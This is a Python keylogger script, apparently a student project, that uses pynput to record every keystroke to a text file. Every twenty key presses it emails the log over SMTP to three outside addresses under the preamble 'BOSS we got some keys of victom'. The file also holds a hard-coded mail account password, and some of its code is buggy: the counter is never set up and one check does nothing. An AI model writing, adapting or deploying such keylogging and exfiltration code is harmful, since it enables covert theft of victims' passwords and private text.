from pynput.keyboard import Key, Listener 


global counter


def mail_it():
	import smtplib
	from email.mime.text import MIMEText
	from email.mime.multipart import MIMEMultipart

	import os

	mail = "alimehdibadamiexample791@gmail.com"
	password = "alibadami0791"
	# can also implement other arguments [target2@mail.com,target1@mail.com]

	destination_mail = ["k213610@nu.edu.pk" , "k214755@nu.edu.pk","k214771@nu.edu.pk"]
	path = "/home/kali/Documents/keyslogging.txt"

	#creating message
	msg = MIMEMultipart("related")
	msg['Subject'] = 'ignore (testing)'
	msg.preamble = "BOSS we got some keys of victom"

	with open("keyslogging.txt",'r') as plaintxt:
		plain = plaintxt.read()
	plaintxt.close()

	msg.attach(MIMEText(msg.preamble))
	msg.attach(MIMEText(plain))


	#initializing smpt connection and sending mail
	server = smtplib.SMTP("smtp.yahoo.com", 587) 
	server.starttls()
	server.ehlo()
	server.login(mail,password)
	server.sendmail(mail,destination_mail ,msg.as_string())
	#server.attach(gmail,destination_mail,path)

	server.quit()
	
	
def on_press(key):
	write_1(key)
	
	global counter
	counter +=1
	if counter%20 ==0:
		mail_it()


def write_1(var):
	with open("keyslogging.txt","a") as f:

		if var == Key.backspace:
			pass

		if var == Key.space:
			new_var = str(var).replace(str(Key.space)," ")
			f.write(new_var)
			

		else:
			new_var = str(var).replace("'",'')
			f.write(new_var)
		f.write(" ")
		counter = counter +1
		f.close()


def on_release(key):
	if key == Key.esc:
		return False

with Listener(on_press=on_press, on_release=on_release) as l:
	l.join()
